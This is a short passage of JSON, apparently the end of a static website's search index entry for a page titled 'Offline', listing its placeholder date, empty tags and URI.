","date":"0001-01-01","objectID":"/offline/:0:0","series":null,"tags":null,"title":"Offline","uri":"/offline/#"}]